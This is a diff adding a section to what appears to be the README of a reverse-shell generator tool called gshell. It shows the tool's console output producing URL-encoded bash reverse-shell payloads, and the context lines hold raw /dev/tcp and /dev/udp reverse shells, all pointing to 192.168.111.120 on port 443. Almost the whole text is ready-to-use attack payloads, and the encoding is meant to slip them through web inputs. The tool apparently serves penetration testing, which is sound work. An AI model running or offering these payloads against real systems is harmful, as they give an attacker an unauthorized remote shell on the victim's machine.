@@ -175,6 +175,38 @@ bash -i >& /dev/tcp/192.168.111.120/443 0>&1
 bash -i >& /dev/udp/192.168.111.120/443 0>&1
 ```
 
+Here is an example of an encoding:
+
+```sh
+PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443 -r -s bash --url 
+[+] The IPv4 address: 192.168.111.120 is valid.
+[+] The port number: 443 is valid.
+[+] Shell type is valid
+[+] Preparing reverse shells
+[+] Generating bash shells
+[+] Adding URL Encoding
+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3E%261%0A
+
+----------------NEXT CODE BLOCK----------------
+
+0%3C%26196%3Bexec+196%3C%3E%2Fdev%2Ftcp%2F192.168.111.120%2F443%3B+sh+%3C%26196+%3E%26196+2%3E%26196%0A
+
+----------------NEXT CODE BLOCK----------------
+
+%2Fbin%2Fbash+-l+%3E+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3C%261+2%3E%261%0A
+
+----------------NEXT CODE BLOCK----------------
+
+bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.111.120%2F443+0%3E%261%0A
+
+----------------NEXT CODE BLOCK----------------
+
+bash+-i+%3E%26+%2Fdev%2Fudp%2F192.168.111.120%2F443+0%3E%261
+
+----------------NEXT CODE BLOCK----------------
+
+```
+
 # Installation in Linux
 
 Clone or download the repository:
